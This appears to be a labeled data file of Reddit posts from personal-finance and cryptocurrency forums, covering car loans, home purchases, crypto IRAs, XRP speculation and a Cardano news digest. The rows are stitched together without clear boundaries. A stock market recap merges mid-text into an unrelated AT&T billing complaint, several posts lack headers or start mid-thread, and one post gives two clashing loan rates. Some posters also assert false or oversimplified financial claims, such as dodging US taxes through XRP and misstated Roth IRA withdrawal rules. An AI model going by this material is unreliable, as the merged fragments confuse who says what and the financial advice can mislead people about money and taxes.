TLDR: I have a 7.49% interest loan on a 2012 Lexus IS 250 that is in great shape. Is trying to get more for my money by capitalizing on the current used car market and getting a new vehicle a bad move? Should I try to refinance now that my credit is better?

But I would be happy to get more help on what to do. The short summary is I got injured at work, I needed surgery for my lower back(L4-L5 dislocated disk) it took 8 months to finally have my company pay for the surgery. Afterwards my lawyer and my company lawyer agreed for a settlement, but I had to resign which I did. I've been unemployed for a month and half now. The only big expenses I have is Car payment ($344) I owe $19,987 interest rate 5.09% and college loan which is $2,898. I do want to go back to school this fall and start a new career so I can avoid working hard labor. thank you and I appreciate the help.",finance

CryptoCurrency,SEC statement regarding certain broker/dealers and their compliance to FINRA.,"Edit: included wrong link, here is link to federal register 

https://www.federalregister.gov/documents/2021/02/26/2020-28847/custody-of-digital-asset-securities-by-special-purpose-broker-dealers

Brokers have until April 27th to become compliant or will have intervening measures taken through SEC and FINRA.

Just a reminder that if your broker does not allow you to withdrawal to a private wallet, you do not own those assets and SIPC and FDIC do NOT insure them in light of a broker dealer failure.

SEC and FINRA sent out a letter 6 months ago stating brokers who use secondary transactions (hold the asset for you and do not allow you to withdrawal) have 6 months to ensure they are compliant with Customer Protection Rule.

Just trying to help inform those using certain brokers who do not allow for withdrawal, could be liable for all losses and not insured if a broker has insolvency issues.

Edit 2: added from comment below:

This is more or less the point I’m trying to get across:

With what happened with Mt. Gox in 2013, and recently with Thodex this month, if you do not have access to your crypto wallets private keys, you do not own them.  

This includes when transferring to reputable brokers or trading platforms. As soon as your assets leave your private wallet and transfers to someone else’s, it is no longer in your possession and is not insured by SIPC or FDIC if broker or trading platform goes under.

If you are not actively trading, I would highly recommend removing assets from brokers/trading platforms and transfer to cold storage.

Additionally, this post is trying to get across that SEC and FINRA are trying to tighten up security for investors and they gave out a 6 month warning ahead of time in order to give brokers adequate time to fall into compliance with the Customer Protection Rule.

That being said, if for some reason, brokers have not had either the funds or the desire to fall into compliance over the last 6 months, tomorrow is the day where the scrutiny of the brokers tightens up.

Like everything, when new rules or procedures change, the chances of mistakes being made usually happen when they are first implemented, so I wanted to give everyone a warning ahead of time.",cryptocurrency
XRP,New to XRP. Crypto-bear until now. I believe XRP is the future and am in 40% A few questions.,"Context provided in the post. if TLDR, questions at the bottom. Thanks.

&amp;#x200B;

Who am I: Gold and silver guy. Bearish on the stock market. Keenly aware of inflation and trying to hedge against it and get rid of my dollars except for my emergency fund. Up until now extremely suspicious of crypto.

&amp;#x200B;

Why I decided to buy crypto (namely XRP--and only XRP): The federal government has expressed interest in moving to a cashless society. Whether this is a good or a bad thing is neither here, nor there. My gut has told me for quite a while that when the dust settles (who knows when that will be..) the vast majority of cryptos are eventually going to fall into nothingness and that a handful will rise to heretofore unthinkable heights. My only problem with 'jumping in' was I had no way of knowing which of those would be the ones that survived so I held off. The fact that the other cryptos seem to rely almost exclusively on speculation and hype with almost no utility is a huge red flag to me. Bitcoin is a joke and reminds me of the tulip mania bubble. People are making gains (that's undeniable) but in my mind, it is a forgone conclusion that Bitcoin WILL burst and my gut tells me the elite are simply using it as a pump-and-dump. Case in point: The constant ads I see about Bitcoin. That right there is enough to make me think it's sketchy. If the masses are flocking to it, it's too late in my opinion.

I first heard about XRP from a friend and mentor who recently sold a company he had a 40% stake in. He's a frugal guy and didn't know what to do with the money (several million after-tax). He told me about XRP and.. although initially skeptical, I was impressed. The speed of transaction, the utility, the ability to avoid taxes until you are absolutely ready to pay them (by converting to foreign currency and not being tied to the US dollar--of which I am very bearish..) Then I hear about this bogus SEC lawsuit that almost seems fishy (almost as if it was presented for the purpose of theater, if you get what I mean..? Like it was a calculated move to lower the price temporarily--almost??) And I find this: [https://www.weforum.org/organizations/ripple](https://www.weforum.org/organizations/ripple) featured on the World Economic Forums website.

The fact that the CEO of Ripple has met with central bankers and the fact that an ex-fed employee works for Ripple... All of this seems extremely sketchy to me, (in a good way...) My thinking goes something like this: The elite will always end up on top. They have the media, academia, corporations, the federal government, intelligence agencies, etc. furthering their goals. I don't have to 'like' what is going on to make money from it. I've perused the Bitcoin subreddit and am struck by how many people openly admit to investing for ideological reasons (i.e. sticking it to 'the man'.) I got news for Bitcoin bulls: 'The man' always wins. Always. 'The man' will win until Jesus comes again... The corrupt will always find a way to get what they want. So... with that said, I'm positioning myself to be where the IMF, WEF, central banks, etc. are looking like they're going to be positioned. I'm not interested in short-term gains or selling any time soon. I'm looking for what I think will be the worldwide standard in digital currency transactions in twenty year's time. And I have found it with XRP. I'm in this for the long-haul and would never panic-sell. I'm going to sit down with my wife and write down a schedule as far as when we will sell and (how much) depending on certain milestones reached, but even then it will be no more than 35%. I'm here to stay.

&amp;#x200B;

Questions:

1. I've heard that uphold is not the greatest digital wallet, but that's how I bought XRP. I think there's a 60-day holding period where I can't transfer to another wallet, but when that time period is up why might it be a good idea to switch to a different wallet?
2. Uphold's fees seem insanely high, but I don't know of an alternative to buy XRP. Can anyone recommend another way to buy XRP for someone living in the U.S.?
3. 'hot' vs 'cold' wallet. Why is a 'cold' wallet so much better? Are 'hot' wallets really that risky? What is a hypothetical scenario where a 'hot' wallet might end being a big problem? Please ELI5.
4. I've heard it said that XRP will bring about decentralized finance. From what I can tell Central banks seem very warm to XRP. My question is this: why would the CB's (who effectively have a global monopoly/cartel on finance) partner with Ripple to make XRP the new world reserve currency after the dollar's debasement is complete? Why would the CB's be warm to XRP if it supposedly brings about the very thing that ends their monopoly?
5. What are your thoughts on accumulating XRP, versus owning Ripple stock? So far I've just been accumulating XRP, but I'm interested to hear what the community thinks of the future profitability of Ripple stock.

personalfinance,Bad decision on first time home purchase?,"Hi all, 

My fiance and I are in contract to buy a home in the SF Bay Area as first time homeowners, on track to close in 2 weeks. While we are happy to exit the search from this crazy market, it's also hard not to feel like we may have made a colossal mistake with people predicting that the housing market bubble might burst soon. Here's our situation:

\- High income earners (combined gross earnings north of 700k / yr) with stable jobs - fiance is in health care, I'm in tech. He's 35, I'm 37. We spent the past decade in training; our current high income situation started this year, although we've been saving for the past 2 years for a house. No kids, but we might want to have one (and no more than one) in 2-3 years. 

\- Current cash reserves (after down payment and closing costs) \~30k. Current investments including retirement accounts is \~530k. Taxable investments are \~110k of the 530k. We max out both of our 401ks, backdoor Roths, and HSAs each year. 

\- Our total monthly expenses, besides rent, are about $3000 but we can shrink these to &lt; $2000 with more discipline. 

\- I have 75k of student loans left. Currently interest rate is at 0% but once that expires in the fall, I'll either pay them off or refinance to a lower rate (otherwise the rate would resume at 6.55%)

&amp;#x200B;

The house:

\- We're in contract for a $2 million SFH in an upper middleclass neighborhood on the SF Peninsula, average school district. It's a small 3BR 2Ba built in the 50s on a larger-than-normal lot (&gt;6k sqft).

\- No renovations needed, but we're estimating at least 20k in repairs in the next 3 months, including termite extermination before we move in next month, and possibly another 20-30k later this year (landscaping, drainage improvement, etc). 

\- We had planned to put 20% down, but the appraisal came up short, and we made up the gap (painfully) -- effectively putting 25% down. Interest rate is 2.875% fixed for 30 years. PITI comes out to \~9k per month, but we plan to pay down the mortgage more aggressively. 

&amp;#x200B;

We would not have planned to buy a home this year, especially during this insanity, if not for me starting my dream job and us finally knowing we want to stay in this area for at least 5 years. We started with a target of 1.5M but quickly realized that only buys a teardown shack around here--literally. Would have looked into East Bay if commute had been an option (fiance has to live within 30 min of work). 

Since our take home pay is 20 to 35k a month, I think we could still save a healthy amount despite the 3x increase in house-related expenses from owning a home.  With 25% down, it's unlikely we'd go underwater even if home prices crashed. Yet...should we have gone with a 1M condo in a better school district that we could pay off much faster? Should we have continued as renters in our 800 sqft apartment and stashed everything away in index funds? 

I think we'll love living in the house, but this is the largest purchase and the most leveraged that we'll probably ever be. Your thoughts?",finance

stocks,"Here is a Market Recap for today Monday, April 26, 2021","**PsychoMarket Recap - Monday, April 26, 2021**

The stock traded mixed on Monday, with the S&amp;P 500 (SPY) and Nasdaq (QQQ) continuing strong momentum from last week while the Dow Jones (DIA) modestly fell. Looking ahead, market participants are preparing for a slew of corporate earnings, new economic data, and the Federal Open Market Committee’s April meeting.

This week, a slew of huge companies are set to report corporate earnings for the first quarter of 2021. Altogether, the market caps of the companies reporting this week comprise nearly half the total market cap of the S&amp;P 500, according to FactSet. So far, the vast majority of companies have vastly exceeded analyst estimates, with effective vaccine distribution in the US helping stoke demand as the economy gradually reopens. 

Eighty-four percent of the S&amp;P 500 companies that have reported first-quarter results to date posted a positive earnings per share surprise, according to data from FactSet. This would mark the highest percentage of companies reporting upside surprises since FactSet began tracking this metric in 2008, assuming this beat rate holds through the end of earnings season. 

Last week on Thursday, stocks sold off sharply following reports President Biden will propose almost doubling the capital gains tax rate for wealthy individuals earning $1 million or more per year to 39.6% to help pay for a slew of social programs and the proposed infrastructure bill. The new 39.6% rate would almost double the tax rate from the current base rate of 20%. However, the sharp bounce back we have seen suggests the initial sell-off was overdone. Kathy Jones, chief fixed income strategist at Charles Schwab said, “I think the immediate reaction was probably a bit overdone. These proposals come out and you never know, especially with tax proposals, where we'll end up. So it looks like an opening bid. I'm sure there will be intense lobbying from the investment community to adjust those numbers. But I think at the moment, when you have very high valuations in the market, anything that is bad news can spark a bit of a sell-off.""

The Federal Open Market Committee (FOMC) will meet for its April meeting on Tuesday and Wednesday, with a monetary policy decision and press conference from Federal Reserve Chair Jerome Powell slated for Wednesday afternoon. With the Fed having already signaled that benchmark interest rates would remain on hold through at least 2023, market participants are expecting virtually no major changes to policy to be announced.

I moved to new area that did not offer ATT internet so I called to cancel before my move so I could drop my equipment off on the way out. The rep I spoke to, much to my surprise, said that we actually could keep our equipment and move our internet to our new address but the TV wasn't available. Against my better judgment, I let the rep convince me to move the service instead of canceling. He gave instructions about the service install, scheduled the date, and instructed me to keep my router and the installer would take care of the cable box return.

Fast forward to the install date. No call. No installer showed up. Call AT&amp;T 4:30pm on a Friday and ""oops we actually don't offer internet there. We have to close the account. Please drive to the nearest fedex location (\~2 hours away) to return your equipment."" The rep has no other options for me but to make the drive.

Talked to another rep who says they can mail me a ""return kit"" to my new address and it should arrive in a few days. Great! After a week with no kit, I call back to follow up. They say they will send another. Rinse and repeat. Finally, I get a rep who gets me a shipping label. About 2 months of pulling teeth for the label I was promised and I promptly mail my equipment in. I follow up with ATT to give them the shipping tracking number and ask that the equipment fee be removed from my account. They say once the return is processed the account will be credited. Problem solved.

About a month passes and I receive a notice from a collections company to collect my ATT bill. I call ATT and they tell me to dispute it with the collections company. Collections company tells me to talk to ATT and they can't do anything.

TLDR: AT&amp;T customer service reps are either insanely stupid and untrained or straight liars...or both. After 2 months of trying to return equipment and talking to eight different reps to get a shipping label, equipment was returned and was told charges would be removed when the return processed. Now account is in collections. Not getting anywhere filing a dispute with collections. Is there any way I can get ATT to take responsibility for what their representatives said?

\-  I have been putting 8% of my salary along with a 4% company match into a 401k and a roth 401k. Combined value is approx. 42,000.

\- I have \~22,000 in the individual brokerage account of which 15,000 is from deposits I made. Started April last year. Most gains have been a mixture of swing and position trading. Yes, I do recognize that this has been a bull market.

\- I maintain 10,000 in my checking account as a rainy day fund.

\- Good Credit \~800.

\- Trying to move and find a different job.

\- My next goal is to buy a house, but I don't plan to do that soon. Being mobile makes it easier to negotiate a better wage.

\- Currently single. Would like to be married in future. Maybe with children.

The Question:

Some of my older friends and coworkers have told me I should be using a tax advantaged account to avoid the capital gains taxes. My thinking was that since my next goal in life is to buy a house some years down the line I should be trying to build up capital to meet the 20% down for a house, especially since if I stick with EE I would probably be in a high cost of living area like Austin or the Bay Area.

To rephrase the question in the title: Am I right to be investing in a brokerage account to save up ""untied"" money or should I take my friends' advice and put the money in something like a Roth IRA?",finance
Bitcoin,My Biggest Fear is Government Regulation,"I see a bright future for crypto assets because it’s such revolutionary technology.  But my biggest fear is that the US government will regulate the shit out of it or downright ban it and make it illegal.  Other countries have started doing it which I’m sure many are already aware. 

Those countries see that it’s a threat to control the masses.  The US dollar is a big deal.  If bitcoin which I believe is still in it’s infant stage truly starts becoming a threat to the US dollar.  Wouldn’t the US government be like okay fuggit no more bitcoin motherfuckers the party’s over.  That would utterly destroy the value of a bitcoin tremendously.   And I know that the SEC, US government, the feds, the ultra wealthy, or whatever doesn’t give a single fuck about the average American if something doesn’t fit their agenda.  

Do you guys also fear this?  Or am I not seeing the picture?",cryptocurrency

CryptoCurrency,You should know that there are crypto IRAs and 401ks available (US at least),"I'm not a financial advisor so fuck off

Currently I know of two crypto IRAs one of them being icapitol(name sounds sketch but others have said it's safe) and BitcoinIRA(others have said it's safe as well).

ICAPITOL:

 Currently icapitol has a $30 monthly account fee(assuming you start at age 20 until 60 it'll cost you $14,400 in maintenance fees also assuming price stays the same) plus a 1% trading fee. The $30 fee pays for(their words not mine)

Setup of your new IRA or 401k
Facilitation of transfer/Rollover/Contributionto fund your IRA
All necessary IRS/Tax reporting
Unlimited storage with institutional custody partners
iTrustCapital platform support and maintenance

With a minimum of $2500 to start and $1000 minimum annual contribution.

They are also offering a in-kind transfer if you already have a crypto IRA set up with another company.

icapitol has BTC, ETH, ADA, DOT, LINK, BCH, XLM, EOS and LTC available with UNI and COMP coming soon. Also precious metals like GOLD and SILV are available if you're into that sorta thing.

If you are wondering about insurance, assets are insured from 50 million dollars via curv.

BitcoinIRA:

BitcoinIRA has BTC, ETH, BCH, LTC, XLM, ZEC available as assets. I couldnt find any exact fees for BitcoinIRA so if someone who used them could chime in we'd appreciate it. 

Edit: apparently fees are base on size of portfolio so .008% annually. Say you had a portfolio of $100,000
 You'd pay about $840 a year in fees alone

BitcoinIRA currently offers an interest rate of 6% max on cash and 2% on btc and 2.7% on eth.

Funds are currently safuu for a total of 700 million from bitgo. I don't know if this is for each individual person or all the consumers in total.

I couldn't find any minimum contribution info so you'd likely have to ca yourself.


BOTH use cold storage for storing crypto from a custodial service provider Bitgo


FAQs: 

Can I fund my ira with crypto I already own?

   NO you cannot fund an ira with assets already owned(say if you bought from coinbase or binance), you can only fund them with US dollars. But you can bring over assets from an existing ira or 401k with zero penalties 


Which is better for me?

    Itrust offers a flat rate if 360$ a year regardless of amount contributed while BitcoinIRA I believe takes a percentage of .008% annually. So id choose itrust personally 

Why do I want a IRA?

Stolen from u/panda-slap thanks:

    Gains in an IRA, whether it is a Traditional/Rollover or a Roth are not taxed at the end of each year like a regular account would be. However, funds withdrawn from a traditional/rollover IRA are treated as ordinary income in the year they are withdrawn and can be subject to penalties if you are under 59 1/2. Withdrawals from a Roth are tax free after 59 1/2 and you can always withdraw your cost basis without repercussions even under 59 1/2. 

My shitty entry :

     ANY and all gains from iras are tax free if roth. Say over time you put $200k if contributions in but gains of $3million(because crypto) over 35 years. Well you can keep the 3 million tax free because you already paid taxes on the $200k. Fuck the IRS.


What's the maximum amount of contributions I can add?


   Currently it's at $6,000 if you are under 50 years old. If you are over 50 then $7000. 


I already have a roth/traditional ira with vanguard, schwab, fidelity (basically stocks) can I also have a crypto ira?


    Yes you can BUT total contributions cannot exceed $6,000 (or $7,000 if over 50)between however many accounts you have. So you can contribute $2,500 into vanguard and $3,500 into a crypto IRA.


How old you do have to be to make contributions?


    Any age but it cannot exceed the yearly wages of the owner of the account. So you cannot max out your 1 year olds ira, they would technically have to work. If they did chores and you paid them a reasonable wage amount of say $5 a week that's $260 a year if wages, translating to a $260 a year maximum contribution.


 Can someone else contribute to my crypto IRA? 

   
    Yes

Edit : forgot some

Can I take out money from a roth ira?

   You can only take out what you contributed that year without penalties but you cannot put it back in. Say you put in 6k for that year, you take out 3k for an emergency. 
But you cannot put those 3k back in for that year

   Current penalties stated on itrust are 10% total portfolio but check with whoever has your ira.

At what age can I cash out? 

   Any but you'll get penalties if you do it before age 59 1/2. 

You also have to have an ira 5 years minimum to get away without penalties. So you cannot start at 58 and cash out 2 years later. You have to wait 5 years

personalfinance,House advice/sanity check,"**About me:** 

* 28M, single, MCOL city.  
* $72K salary + 12.5% annual bonus.  Net paychecks \~2K biweekly.  
   * Average \~1K/month savings over the past 6 months.  In theory I could probably push this closer to $2K, as I've had a number of one-time expenses in that time frame.
* $19K cash + $50K investments/retirement. 
   * Small amount of RSUs in a privately held company that could be worth nothing, low six figures (paper value), or potentially more, but unlikely to be a factor for at least 4 years.  Not counted in the value of investments.
* Paid off vehicle (2009 Vibe w/ 89K miles, so should be solid for the foreseeable future).  No debt.

**The house:**

*   3BR/1BA townhouse in 12/2019 for 188K @ 3.75%.  Just under $1K/mo mortgage payment.
* Current balance \~$147.5K.  
* \~$10K worth of upgrades into the house thus far (all new appliances, refinished floors, new front door + garage door opener, few cosmetic and minor electrical improvements). 
* Talked to a realtor and a Redfin agent and the estimates they gave me have it \~$209K right now.   Suggested it might appreciate another 5-10% over the next year, but were understandably reluctant to forecast beyond this summer. 
* The location is very good (why I bought it) and housing prices are rising with supply low to the point where it would be difficult/impossible to afford a SFH within the city limits, at least in any halfway decent area/condition.

**The problem:** 

Due to my previous living situation, I didn't anticipate how big an issue having a shared wall would be.  Hearing my neighbors phone ring, them watching TV at literally all hours of the night, etc. drives me up a wall.      I'm also a powerlifter (a significant part of the reason I wanted to own a house rather than rent was to be able to set up a home gym) and noise is a factor there.  There are certain accessory exercises I just can't responsibly do that I would like to.  In hindsight, it should have been an obvious decision to avoid an attached dwelling given my general strong desire for privacy and the nature of my hobby, but I wanted the location and wasn't fully considering everything, so here we are.

I know it's hard to realistically sell without taking a huge loss before at least 2 years due to the ownership/use tests for the IRS capital gains exemption.  The houses I'm looking at now that meet my criteria (SFH, proximity to work, 2+ bathrooms) tend to end up selling for at least $230-250K at a minimum. If I wait until early 2022 and the market continues to rise as expected, I'm looking at a $250-275K house.  If I wait longer, I'm worried I'll get priced out and stuck listening to my neighbors forever.

**Questions**:

Right off the bat, I'm sure r/personalfinance will level with me if I'm just talking crazy: is there no financially rational path to sell and buy a different home within the next year, given my relatively low liquid reserves?  

Conversely, is it possible that it makes sense to sell and buy a new home during the 2021 spring/summer season while interest rates are still decent and before housing prices continue to rise further, even though that would mean paying capital gains on my current home's appreciation?  

Basically, what's the most aggressive timeline I could responsibly take here?",finance

At the same time, I'm trying to get a handle on a proper move for retirement/investing/paying off my student loans. My head is spinning, to say the least.

I'm a year out of college with not much financial education/experience. I've been learning a lot from this subreddit, but some more specific advice on my situation would be greatly appreciated! Thanks in advance.

Current situation: I have student loans that, if I pay only the minimum (which I don't plan on doing), will last me for 10 years. With my current employer, I've been contributing the minimum amount to my 401k to get the full matching. I have a checking and savings account (3 month emergency fund) with Bank of America (I am looking to change banks soon). I also just opened up a Roth IRA and a brokerage account. 

I know that paying off my loans as soon as possible, because their interest rates are higher than the average market growth, is what is recommended by the Wiki and whatnot, but it doesn't seem right to me. Shouldn't I be investing at least a little bit? I feel like those 5-10 years of my life where I'll be grinding payments to get rid of my student loans is a lot of time lost where I could instead be building a stronger foundation for growing money for my future.

Last year I purchased a 2016 Mazda3 with a credit score that was in the mid 500's. I believe my interest rate is 27%.

Today, my credit score is a little over 600 and a few weeks ago I got an offer from capital one to refinance my car at a 9% interest rate. I just paid off a medical debt which was sitting on my credit for about two years so if I decide to go through with this i'll wait a couple months for that debt to fall off. I've been reading about refinancing and I feel like the more I read into it the more confusing it seems. The payoff for my car right now is $17,540 and the fair market value is approx. $14,000 for my mileage (48k). Would it make sense to refinance? If not I would try to pay this down as quickly as possible but that doesn't sound practical right now as i'm trying to save for a house. Thanks in advance!",finance

Let's go....

Newly covered today: 

1. Binance Smart Chain has already laid out a very compelling argument that we’re going to CRUSH Ethereum.  [https://twitter.com/TheADAApe/status/1386583952668958720](https://twitter.com/TheADAApe/status/1386583952668958720)
2. Charles does a big interview with Forbes and points out the huge differences between a bonded staking system (ETH) and a liquid staking system (Cardano). This is highly overlooked. [https://www.forbes.com/sites/stevenehrlich/2021/04/26/cardano-and-ethereum-founder-analyzes-the-newest-evolutions-in-crypto-and--blockchain-technology/?sh=6acb258e3e52](https://www.forbes.com/sites/stevenehrlich/2021/04/26/cardano-and-ethereum-founder-analyzes-the-newest-evolutions-in-crypto-and--blockchain-technology/?sh=6acb258e3e52)
3. Charles also covers his projections about interoperability and the future converging on a “wifi moment” when an interoperable “internet of blockchains” emerges.  In this future, it will be a race to the bottom and the systems that are too expensive to operate will simply be priced out of the game.
4. New Africa Special Trailer dropped.  The narrator: “We are partnering with African governments…”  That was PLURAL governments, guys!  This is getting exciting. [https://twitter.com/InputOutputHK/status/1386772333902319618](https://twitter.com/InputOutputHK/status/1386772333902319618)

Previously Covered but still interesting:

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia.

3. Charles says they are actually going to hire investigators for the IOG anti-scammer team. People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon. Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel.

9. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
10. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
11. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher.

But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture.

It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline. Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors.

31. Ourobouros Omega. Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon. Ourobouros Praos was 2017 and it’s still running now. Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
32. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server. Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year. It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
33. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
34. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot. They could also add Hyperledger related permissioned sidechains with this.
35. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way. Hydra will be run by the stake pool operators.
36. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this.
37. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
38. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
39. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting.
40. Commercial. On the commercial side they are really going to scale things up to the eight figure level. There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.
41. Coinbase now has a Cardano Explainer. [https://www.coinbase.com/learn/crypto-basics/what-is-cardano](https://www.coinbase.com/learn/crypto-basics/what-is-cardano)

47. Dewayne Cameron was on Cardano Live. Whether you are interested in DeFi or not, this is likely to be one of the big early Cardano based projects. This interview has all the latest info on Liqwid. Sounds like the alpha testnet will be end of April/early May with three or four core contracts. Rick does a really good job of asking questions that a large spectrum of listeners will be able to relate to and they get into the details of how the contracts will work. At 20:01 Dewayne mentions a “Cardano Dex, or the Dex that IOHK and Emurgo are working on...” Very interesting tidbit there! [https://youtu.be/JhO5iC08xSA](https://youtu.be/JhO5iC08xSA)
48. The Plutus Pioneer program has been open sourced! Lecture #1 has an extremely good explanation of why the EUTxO model in Cardano is so much more conducive to security and much greater predictability than the account balance model in Ethereum.

59. Occam.fi partners with Bitcoin.com as custodian to create an ETH-ADA bridge. According to the article, this will allow for any Cardano native token to seamlessly switch to an ERC-20 token and vice versa. The vice versa part is what the ERC-20 Converter does for us already right?

60. LunarCrush interviewed Charles and he gave us some more details on the Ethiopia deal and Africa: 1) the IOHK office in Ethiopia is merging with the Singularity Net Office (it’ll be 30-50 people...so pretty large presence); 2) Africa special to be announced very soon; 3) they will be doing fintech &amp; govtech, 4) everything on the governance side is going to be upgraded across a wide swathe of African nation states in next ten years, 5) lots of possible use cases including supply chains in agritech, putting land on a ledger, voting, identity, reputation (i.e. credit), &amp; payment systems; 6) Africa is like investing in China in the 1980s; 7) the demographics of Africa make it a really easy call to direct investment there; 8) charles said “Ethiopia, in particular, is very special to us and WE HAVE ACTUALLY CLOSED SOME DEALS...we’ll talk about those at the Africa Special”; 9) there will be security token plays in Africa in the mid 2020s since there are no stock exchanges; and 10) there is a big unannounced partnership called “the DCF” with a brand name consultancy we will recognize.

77. We just experienced a big flash crash in price. A prime suspect is the drop in hash rate in BTC due to the Blackouts in China. Is the crypto space ready to accept that Nakamoto style consensus on PoW leads directly to unacceptable levels of centralization? This has been the dirty secret of PoW crypto and its decentralization loving enthusiasts for years.

78. Charles posted a somewhat cryptic tweet that read “Omega + Hydra + Mithral = GG”. The Ourobors Omega, Ouroboros Hydra, &amp; Mithral parts we’ve covered before. Omega is a capstone rollup of Praos (2017), Genesis (2018), + Redux, +Chronos, +Ledger Combiners, +some other things from the rest of the space. Hydra is layer two. Mithral is trustless light wallets via zk-SNARKs. Guesses as to the “GG” ranged from “Good Game” (as in game over for competitors) to “Goguen”. See today’s video at the link above for more discussion on this. [https://twitter.com/IOHK\_Charles/status/1383792375860924424](https://twitter.com/IOHK_Charles/status/1383792375860924424)

85. Shahaf Bar-Geffen, CEO of COTI (the first recipient of a Cardano CFund investment), says he just finished recording his segment in the Africa special which he mentioned was airing at the end of April prior to the IOHK announcement of April 29th. He also said: 1) ADA Pay may be ready in early May or maybe even late April; 2) there will be a big launch for ADA Pay and once the Africa Special airs “everything will connect”; 3) “people are probably not getting how big this is….but you will down the line”; 4) COTI integration with a major exchange is happening, progress is not as quick as they would like, but it’s progressing; 5) last week they released the possible designs for debit cards, they are even considering some designs submitted by the community; 6) and iOS and Android integration is coming along nicely and well on the way. [https://www.youtube.com/watch?v=EorsiQfEV7o](https://www.youtube.com/watch?v=EorsiQfEV7o)

87. It looks like Yellow Card and Payway are listed on the Africa Special website. Given their business models, it is easy to guess that they could be valuable in the Pan Africa Strategy. [https://payway.et/](https://payway.et/) [https://yellowcard.io/](https://yellowcard.io/)
88. Partnership with World Mobile in Tanzania. Credit to Reddit user [/u/ricklepicklemydickle](https://www.reddit.com/u/ricklepicklemydickle/) for finding this one.

89. Recap from yesterday: the Africa Special Announcements revealed some additional puzzle pieces 1) COTI’s AdaPay is possibly the larger payments infrastructure puzzle piece, 2) [payway.et](https://payway.et/) is possibly the local payments puzzle piece, 3) [yellowcard.io](https://yellowcard.io/) is possibly the local coin exchange puzzle piece, and 4) World Mobile (not mentioned at [africa.cardano.org](https://africa.cardano.org/) AFAIK) may be the network connectivity puzzle piece. I think they are going to connect a lot of disparate pieces for us on the 29th.
